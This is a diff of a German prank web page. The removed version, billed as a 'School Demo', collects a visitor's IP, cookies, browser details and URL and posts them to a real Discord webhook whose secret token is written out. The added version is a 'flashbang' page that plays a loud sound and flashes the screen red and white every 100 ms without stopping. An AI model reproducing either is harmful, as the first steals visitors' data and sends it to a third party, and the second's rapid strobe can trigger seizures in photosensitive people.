@@ -2,108 +2,63 @@
 <html lang="de">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>School Demo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Augenfreundlich... bis zum Klick</title>
   <style>
     body {
-      background-color: #424141;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
       margin: 0;
       padding: 0;
-    }
-
-    h1 {
-      margin-top: 40px;
+      font-family: sans-serif;
+      background-color: #1e1e1e;
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      transition: all 0.2s ease-in-out;
     }
 
     button {
-      margin-top: 20px;
-      padding: 12px 25px;
-      font-size: 18px;
-      background-color: #673ab7;
-      border: none;
-      border-radius: 6px;
+      padding: 1em 2em;
+      font-size: 1.2em;
+      background-color: #4caf50;
       color: white;
+      border: none;
+      border-radius: 8px;
       cursor: pointer;
+      transition: background-color 0.2s;
     }
 
     button:hover {
-      background-color: #261445;
+      background-color: #388e3c;
     }
 
-    #gif-container, #info {
-      margin-top: 30px;
-    }
-
-    pre {
-      background-color: #1e1e1e;
-      padding: 10px;
-      border-radius: 8px;
-      overflow: auto;
-      text-align: left;
-      display: inline-block;
-      max-width: 90%;
+    .flashbang {
+      background-color: white !important;
+      color: black !important;
     }
   </style>
 </head>
 <body>
-  <h1>Demo zu wie dumm der Mensch sein Kann</h1></h1>
-  <button onclick="simulateHack()">Teste Mich du geile Puppe</button>
-  <div id="gif-container"></div>
-  <div id="info"></div>
+  <h1>Drück den Button 👇</h1>
+  <button onclick="flashbang()">Mach Boom</button>
+
+  <audio id="boom" src="https://www.myinstants.com/media/sounds/ralf.mp3"></audio>
 
   <script>
-    function simulateHack() {
-      const gifUrl = "https://c.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif";
-      document.getElementById("gif-container").innerHTML = `<img src="${gifUrl}" width="400"/>`;
+    function flashbang() {
+      document.body.classList.add("flashbang");
 
-      const platform = navigator.platform;
-      const userAgent = navigator.userAgent;
-      const language = navigator.language;
-      const cookies = document.cookie || "Keine Cookies vorhanden";
-      const screenRes = `${screen.width}x${screen.height}`;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const audio = document.getElementById("boom");
+      audio.volume = 1.0;
+      audio.play();
 
-      fetch("https://api.ipify.org?format=json")
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip;
-
-          const collected = {
-            "📍 Öffentliche IP": ip,
-            "💻 Gerät / Plattform": platform,
-            "🌐 Browser / Engine": userAgent,
-            "🗺️ Sprache": language,
-            "📅 Zeitzone": timezone,
-            "🖥️ Bildschirmauflösung": screenRes,
-            "🍪 Cookies": cookies,
-            "🔗 Referrer": document.referrer || "Direktzugriff",
-            "📂 Aktuelle URL": window.location.href
-          };
-
-          let display = `<h2>Gesammelte Daten. Daran erkennt man wie gefährlich das Internet sein kann</h2><pre>${JSON.stringify(collected, null, 2)}</pre>`;
-          document.getElementById("info").innerHTML = display;
-
-          const webhookUrl = "https://discord.com/api/webhooks/1366096941276205187/JfPcRLToJjK1u_tdWogf6jbJczFqNIrzf-6ohbfLAIrDanj1Bm_LCVU85TzyUmUHluNl";
-
-          // Beispiel: Sende alles an Discord für die Demo
-          fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              content: "**Neue Test Daten**\n```json\n" + JSON.stringify(collected, null, 2) + "\n```"
-            })
-          });
-        });
-
-      // 🔍 (Fake) Tastaturüberwachung (nur zu Simulationszwecken)
-      window.addEventListener("keydown", e => {
-        console.log(`[KEYLOGGER-DEMO] Taste gedrückt: ${e.key}`);
-      });
+      // Optional: Bildschirm blinken lassen
+      setInterval(() => {
+        document.body.style.backgroundColor =
+          document.body.style.backgroundColor === "white" ? "#ff0000" : "white";
+      }, 100);
     }
   </script>
 </body>
